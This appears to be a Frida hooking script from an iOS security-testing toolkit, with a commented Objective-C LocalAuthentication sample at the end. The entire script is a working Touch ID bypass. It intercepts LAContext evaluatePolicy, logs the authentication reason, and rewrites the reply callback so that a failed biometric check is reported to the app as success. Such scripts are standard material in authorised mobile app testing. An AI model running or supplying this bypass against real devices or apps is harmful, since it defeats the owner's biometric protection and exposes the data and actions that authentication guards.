// Attempts to 'bypass' TouchID by responding with a successful
// operating system response to evaluatePolicy.

var resolver = new ApiResolver('objc');
var LAContext_evaluatePolicy_localizedReason_reply = {};

resolver.enumerateMatches('-[LAContext evaluatePolicy:localizedReason:reply:]', {
    onMatch: function (match) {
        LAContext_evaluatePolicy_localizedReason_reply.name = match.name;
        LAContext_evaluatePolicy_localizedReason_reply.address = match.address;
    },
    onComplete: function () { }
});

if (LAContext_evaluatePolicy_localizedReason_reply.address) {

    send({
        status: 'success',
        error_reason: NaN,
        type: 'touchid-bypass',
        data: 'Hooked ' + LAContext_evaluatePolicy_localizedReason_reply.name
    });

    Interceptor.attach(LAContext_evaluatePolicy_localizedReason_reply.address, {
        onEnter: function (args) {

            // localizedReason:
            var reason = new ObjC.Object(args[3]);
            send({
                status: 'success',
                error_reason: NaN,
                type: 'touchid-bypass',
                data: 'Localized Reason for auth requirement: ' + reason.toString()
            });

            // get the original block that should run on success for reply:
            var original_block = new ObjC.Block(args[4]);

            // save that block as a callback, to run once we change the reply
            // from the OS to a true
            var saved_reply_block = original_block.implementation;

            original_block.implementation = function (success, error) {
                send({
                    status: 'success',
                    error_reason: NaN,
                    type: 'touchid-bypass',
                    data: 'OS authentication success response: ' + success
                });

                if (!success == true) {

                    send({
                        status: 'success',
                        error_reason: NaN,
                        type: 'touchid-bypass',
                        data: 'Marking OS response as True instead'
                    });

                    // Change the success response from the OS to true
                    success = true;
                }

                // and run the original block
                saved_reply_block(success, error);

                send({
                    status: 'success',
                    error_reason: NaN,
                    type: 'touchid-bypass',
                    data: 'TouchID bypass run complete'
                });

            };
        }
    });
}

// -- Sample Objective-C
//
// LAContext *myContext = [[LAContext alloc] init];
// NSError *authError = nil;
// NSString *myLocalizedReasonString = @"Please authenticate.";

// if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthentication error:&authError]) {
//     [myContext evaluatePolicy:LAPolicyDeviceOwnerAuthentication
//               localizedReason:myLocalizedReasonString
//                         reply:^(BOOL success, NSError *error) {
//                             if (success) {

//                                 dispatch_async(dispatch_get_main_queue(), ^{
//                                     [self performSegueWithIdentifier:@"LocalAuthSuccess" sender:nil];
//                                 });

//                             } else {

//                                 dispatch_async(dispatch_get_main_queue(), ^{
//                                     UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"Error"
//                                                                                         message:error.description
//                                                                                         delegate:self
//                                                                                cancelButtonTitle:@"OK"
//                                                                                otherButtonTitles:nil, nil];
//                                     [alertView show];
//                                     // Rather than show a UIAlert here, use the error to determine if you should push to a keypad for PIN entry.
//                                 });
//                             }
//                         }];
